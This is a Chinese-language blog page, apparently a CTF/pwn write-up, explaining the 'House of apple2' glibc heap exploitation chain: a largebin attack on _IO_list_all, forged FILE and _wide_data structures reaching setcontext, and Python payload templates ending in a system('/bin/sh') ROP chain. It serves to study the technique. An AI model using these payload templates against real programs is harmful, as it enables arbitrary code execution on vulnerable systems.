@@ -1,0 +1,231 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+
+    
+      <link rel="icon" href="/favicon.png" />
+    
+
+    <title>
+        
+          House of apple2 - C12en
+        
+    </title>
+
+    <!-- Spectre.css framework -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/spectre.css/0.5.9/spectre.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/spectre.css/0.5.9/spectre-exp.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/spectre.css/0.5.9/spectre-icons.min.css">
+
+    <!-- theme css & js -->
+    
+<link rel="stylesheet" href="/css/book.css">
+
+    
+<script src="/js/book.js"></script>
+
+
+    <!-- tocbot -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
+    
+    <!-- katex -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+
+    
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/zooming/2.1.1/zooming.min.js"></script>
+<script>
+document.addEventListener('DOMContentLoaded', function () {
+    const zooming = new Zooming()
+    zooming.listen('.book-content img')
+})
+</script>
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body>
+
+<div class="book-container">
+  <div class="book-sidebar">
+    <div class="book-brand">
+  <a href="/">
+    <img src="/favicon.png">
+    <span>C12EN</span>
+  </a>
+</div>
+    <div id="menu" class="book-menu hide">
+  
+</div>
+
+
+<script src="/js/book-menu.js"></script>
+
+  </div>
+
+  <div class="sidebar-toggle" onclick="sidebar_toggle()" onmouseover="add_inner()" onmouseleave="remove_inner()">
+  <div class="sidebar-toggle-inner"></div>
+</div>
+
+<script>
+function add_inner() {
+  let inner = document.querySelector('.sidebar-toggle-inner')
+  inner.classList.add('show')  
+}
+
+function remove_inner() {
+  let inner = document.querySelector('.sidebar-toggle-inner')
+  inner.classList.remove('show')
+}
+
+function sidebar_toggle() {
+    let sidebar_toggle = document.querySelector('.sidebar-toggle')
+    let sidebar = document.querySelector('.book-sidebar')
+    let content = document.querySelector('.off-canvas-content')
+    if (sidebar_toggle.classList.contains('extend')) { // show
+        sidebar_toggle.classList.remove('extend')
+        sidebar.classList.remove('hide')
+        content.classList.remove('extend')
+    }
+    else { // hide
+        sidebar_toggle.classList.add('extend')
+        sidebar.classList.add('hide')
+        content.classList.add('extend')
+    }
+}
+</script>
+
+  <div class="off-canvas-content">
+    <div class="columns">
+      <div class="column col-10 col-lg-12">
+        <div class="book-navbar">
+          <!-- For Responsive Layout -->
+
+<header class="navbar">
+  <section class="navbar-section">
+    <a onclick="open_sidebar()">
+      <i class="icon icon-menu"></i>
+    </a>
+  </section>
+</header>
+
+        </div>
+        <div class="book-content">
+          <div class="book-post">
+  <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>虽然是名为house of apple2 但是和apple1的利用没有太大的关系 当成一条全新的链就行了</p>
+<p>只需要一次largebin就可以实现的链 适用于2.35这样的高版本 触发条件为exit或者abort 需要调用到io结构体的vtable的overflow函数</p>
+<h2 id="链路分析"><a href="#链路分析" class="headerlink" title="链路分析"></a>链路分析</h2><p>触发的方式和apple1是一样的 可以通过显示调用的exit 或者是从main函数返回的隐式exit 或者是malloc_assert输出报错信息</p>
+<p>下面是通过exit触发的链</p>
+<p>exit -&gt; fcloseall -&gt; _IO_cleanup -&gt; _IO_flush_all_lockp -&gt; _IO_OVERFLOW</p>
+<p>主要的思想就是劫持IO_list_all为堆地址 从而我们可以伪造io结构体</p>
+<p>这里主要注意的就是两个成员  一个是_wide_data 一个是vtable</p>
+<p>我们先说vtable 这里的思路是将其伪造为_IO_wfile_jumps </p>
+<p>这样触发io时会调用到_IO_wfile_overflow 来看一下这个函数主要的内容</p>
+<p><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307161614545.png" alt="image-20230716161414471"></p>
+<p>其内部调用了wdoallocbuf函数 这个函数存在一个任意函数调用的点</p>
+<p><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307161615628.png" alt="image-20230716161503609"></p>
+<p>其索引是通过rax寄存器来的</p>
+<p>而此时的rax值 就是fakeio的0xa0偏移处的wide_data成员</p>
+<p><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307161615252.png" alt="image-20230716161559230"></p>
+<p>其wide_data处要求是一个结构体指针 wdoallocbuf函数会调用该指针的vtable的overflow函数</p>
+<p>如果我们将其控制为setcontext 就可以实现一段rop 哪怕是开启了沙盒 也是适用的</p>
+<h2 id="伪造分析"><a href="#伪造分析" class="headerlink" title="伪造分析"></a>伪造分析</h2><p>关键的伪造点就那几个 </p>
+<p>1.先要把_IO_list_all利用largebin attack先覆盖成可控地址 用来伪造结构体 下面称fakeio1</p>
+<p>2.控制fakeio1的vtable为_IO_wfile_jumps 从而调用到 _IO_wfile_overflow</p>
+<p>3.控制fakeio1的_wide_date为fakeio2</p>
+<p>4.控制fakeio2的vtable为fakeio3</p>
+<p>5.控制fakeio3的偏移0x68处为setcontext</p>
+<p>需要注意的就是最后的rop链存放的位置不能影响到fakeio的其他成员 导致程序执行流无法顺利执行</p>
+<p>还有就是之所以 不直接更改_wide_data-&gt;vtable-&gt;0x68为system函数 然后设置fakeio首地址处为&#x2F;bin&#x2F;sh  这样破坏了flag成员 无法让程序执行流按预期的执行</p>
+<p>剩下的就参考下面的模板吧</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">fakeio1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">IO_wfile_jumps = libc_addr + <span class="number">0x2160c0</span></span><br><span class="line">fake_file = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0x20</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)</span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0xa0</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(chunk5_addr)</span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0xd8</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(IO_wfile_jumps)</span><br><span class="line">payload = cyclic(<span class="number">0x10</span>)+fake_file</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">fakeio2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x58</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(setcontext)</span><br><span class="line">payload = payload.ljust(<span class="number">0x90</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(chunk5_addr+<span class="number">0xf0</span>)+p64(ret_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0xd0</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(chunk5_addr)+p64(<span class="number">0</span>)+p64(rdi_addr)+p64(binsh_addr)+p64(system_addr)</span><br></pre></td></tr></table></figure>
+
+
+
+
+</div>
+
+
+  <div class="book-comments">
+    
+
+
+
+
+  </div>
+
+
+
+<script src="/js/book-post.js"></script>
+
+        </div>
+      </div>
+      <div class="column col-2 hide-lg">
+        <div class="book-post-info">
+  
+    <div class="book-post-meta">
+
+  <div class="author">
+
+    <!-- Author image -->
+    <div class="author-img">
+      
+        <figure
+          class="avatar avatar-lg"
+          data-initial="C"
+          style="background-color: #3b4351;">
+        </figure>
+      
+    </div>
+
+    <!-- Author title -->
+    <div class="author-title">
+      <div>C12en</div>
+      <div>2023-07-16</div>
+    </div>
+  </div>
+
+  
+    <div class="divider"></div>
+
+    <div class="link">
+      <a class="category-link" href="/categories/heap/">heap</a>
+
+      
+    </div>
+    
+  
+
+  <div class="divider"></div>
+</div>
+  
+
+  <div class="book-tocbot">
+</div>
+<div class="book-tocbot-menu">
+  <a class="book-toc-expand" onclick="expand_toc()">Expand all</a>
+  <a onclick="go_top()">Back to top</a>
+  <a onclick="go_bottom()">Go to bottom</a>
+</div>
+
+
+<script src="/js/book-toc.js"></script>
+
+</div>
+      </div>
+    </div>
+  </div>
+  
+  <a class="off-canvas-overlay" onclick="hide_canvas()"></a>
+</div>
+
+</body>
+</html>
+
+
+<script src="/js/book.js"></script>
